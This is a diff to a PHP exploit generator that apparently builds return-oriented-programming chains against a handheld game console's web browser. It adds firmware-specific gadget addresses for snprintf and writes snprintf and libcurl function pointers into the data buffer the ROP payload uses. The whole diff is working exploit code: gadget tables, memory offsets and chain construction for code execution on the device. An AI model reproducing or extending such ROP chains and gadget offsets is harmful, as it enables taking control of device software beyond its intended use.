@@ -187,6 +187,8 @@ if($browserver == 1)
 
 	$APT_PrepareToDoApplicationJump = 0x00155224;
 	$APT_DoApplicationJump = 0x001542d4;
+
+	$ROP_snprintf = $OSSCRO_MAPADR+0x48c-0x4;
 }
 else if($browserver == 2)
 {
@@ -255,6 +257,8 @@ else if($browserver == 2)
 
 	$APT_PrepareToDoApplicationJump = 0x001552b8;
 	$APT_DoApplicationJump = 0x0015454c;
+
+	$ROP_snprintf = $OSSCRO_MAPADR+0x3c0-0x4;
 }
 else if($browserver == 3)
 {
@@ -322,6 +326,8 @@ else if($browserver == 3)
 
 		$APT_PrepareToDoApplicationJump = 0x00299f98;
 		$APT_DoApplicationJump = 0x0029951c;
+
+		$ROP_snprintf = $OSSCRO_MAPADR+0x3c0-0x4;
 	}
 	else
 	{
@@ -442,6 +448,8 @@ else if($browserver == 4)
 
 	$APT_PrepareToDoApplicationJump = 0x00299fb8;
 	$APT_DoApplicationJump = 0x0029953c;
+
+	$ROP_snprintf = $OSSCRO_MAPADR+0x3c0-0x4;
 }
 else if($browserver == 5)
 {
@@ -509,6 +517,8 @@ else if($browserver == 5)
 
 	//$APT_PrepareToDoApplicationJump = 0x00299fb8;//needs updated
 	//$APT_DoApplicationJump = 0x0029953c;//needs updated
+
+	$ROP_snprintf = $OSSCRO_MAPADR+0x3c0-0x4;
 }
 else if($browserver == 6)
 {
@@ -590,6 +600,8 @@ else if($browserver == 6)
 	$ROP_LDMSTM_R5R4_R0R3 = 0x001d39fc;
 
 	$ROP_STMR0_R0PC = 0x001bc8c0;
+
+	$ROP_snprintf = $OSSCRO_MAPADR+0x3c0-0x4;
 }
 else if($browserver == 0x80)//new3ds
 {
@@ -655,6 +667,8 @@ else if($browserver == 0x80)//new3ds
 
 	//$APT_PrepareToDoApplicationJump = 0x00299fb8;//needs updated
 	//$APT_DoApplicationJump = 0x0029953c;//needs updated
+
+	$ROP_snprintf = $OSSCRO_MAPADR+0xd4750-0x4;
 }
 else if($browserver == 0x81)
 {
@@ -720,6 +734,8 @@ else if($browserver == 0x81)
 
 	//$APT_PrepareToDoApplicationJump = 0x00299fb8;//needs updated
 	//$APT_DoApplicationJump = 0x0029953c;//needs updated
+
+	$ROP_snprintf = $OSSCRO_MAPADR+0xd9168-0x4;
 }
 else if($browserver == 0x82)
 {
@@ -800,6 +816,8 @@ else if($browserver == 0x82)
 	$ROP_LDR_R0_FROMR0_SHIFTR1 = $OSSCRO_MAPADR+0x000ff87c;
 
 	$ROP_STMR0_R0PC = $PEERCRO_MAPADR+0x0001ee91;
+
+	$ROP_snprintf = $OSSCRO_MAPADR+0xdb2bc-0x4;
 }
 else if($browserver == 0x83)
 {
@@ -880,6 +898,8 @@ else if($browserver == 0x83)
 	$ROP_LDR_R0_FROMR0_SHIFTR1 = $OSSCRO_MAPADR+0x001027ac;
 
 	$ROP_STMR0_R0PC = $PEERCRO_MAPADR+0x0001ef51;
+
+	$ROP_snprintf = $OSSCRO_MAPADR+0xde1a0-0x4;
 }
 
 if($browserver == 3 || $browserver == 4)$ROP_STR_R0TOR1 = $WEBKITCRO_MAPADR+0x2f9f0;
@@ -1825,7 +1845,7 @@ function generateropchain_type1()
 
 function generateropchain_type2()
 {
-	global $ROPHEAP, $POPLRPC, $POPPC, $ROP_POP_R0R6PC, $ROP_POP_R1R5PC, $OSSCRO_HEAPADR, $OSSCRO_MAPADR, $APPHEAP_PHYSADDR, $svcControlMemory, $ROP_MEMSETOTHER, $IFile_Open, $IFile_Read, $IFile_Write, $IFile_Close, $IFile_GetSize, $IFile_Seek, $GSP_FLUSHDCACHE, $GXLOW_CMD4, $svcSleepThread, $THROW_FATALERR, $SRVPORT_HANDLEADR, $SRV_REFCNT, $srvpm_initialize, $srv_shutdown, $srv_GetServiceHandle, $GSP_WRITEHWREGS, $GSPGPU_SERVHANDLEADR, /*$APT_PrepareToDoApplicationJump,*/ $APT_DoApplicationJump, $arm11code_loadfromsd, $browserver, $FS_MOUNTSDMC;
+	global $ROPHEAP, $POPLRPC, $POPPC, $ROP_POP_R0R6PC, $ROP_POP_R1R5PC, $OSSCRO_HEAPADR, $OSSCRO_MAPADR, $APPHEAP_PHYSADDR, $svcControlMemory, $ROP_MEMSETOTHER, $IFile_Open, $IFile_Read, $IFile_Write, $IFile_Close, $IFile_GetSize, $IFile_Seek, $GSP_FLUSHDCACHE, $GXLOW_CMD4, $svcSleepThread, $THROW_FATALERR, $SRVPORT_HANDLEADR, $SRV_REFCNT, $srvpm_initialize, $srv_shutdown, $srv_GetServiceHandle, $GSP_WRITEHWREGS, $GSPGPU_SERVHANDLEADR, /*$APT_PrepareToDoApplicationJump,*/ $APT_DoApplicationJump, $arm11code_loadfromsd, $browserver, $FS_MOUNTSDMC, $ROP_snprintf, $ROP_curl_easy_cleanup, $ROP_curl_easy_init, $ROP_curl_easy_perform, $ROP_curl_easy_setopt;
 
 	$LINEAR_TMPBUF = 0x18B40000;
 	$LINEAR_VADDRBASE = 0x14000000;
@@ -1941,6 +1961,7 @@ function generateropchain_type2()
 	if(!isset($SRV_REFCNT))$SRV_REFCNT = 0x0;
 	if(!isset($srvpm_initialize))$srvpm_initialize = 0x0;
 	if(!isset($srv_shutdown))$srv_shutdown = 0x0;
+	if(!isset($ROP_snprintf))$ROP_snprintf = 0x0;
 
 	$databuf = array();
 	$databuf[0] = 0x0;
@@ -1970,7 +1991,13 @@ function generateropchain_type2()
 	$databuf[23] = 0x114;//NS appID
 	$databuf[24] = 0;
 	$databuf[25] = $LINEAR_CODETMPBUF;
-	ropgen_writeregdata_wrap($LINEAR_TMPBUF, $databuf, 0, 26*4);
+	$databuf[26] = $ROP_snprintf;
+	$databuf[27] = $ROP_curl_easy_cleanup;
+	$databuf[28] = $ROP_curl_easy_init;
+	$databuf[29] = $ROP_curl_easy_perform;
+	$databuf[30] = $ROP_curl_easy_setopt;
+
+	ropgen_writeregdata_wrap($LINEAR_TMPBUF, $databuf, 0, 31*4);
 
 	ropchain_appendu32($POPLRPC);
 	ropchain_appendu32($ROP_POP_R0R6PC);
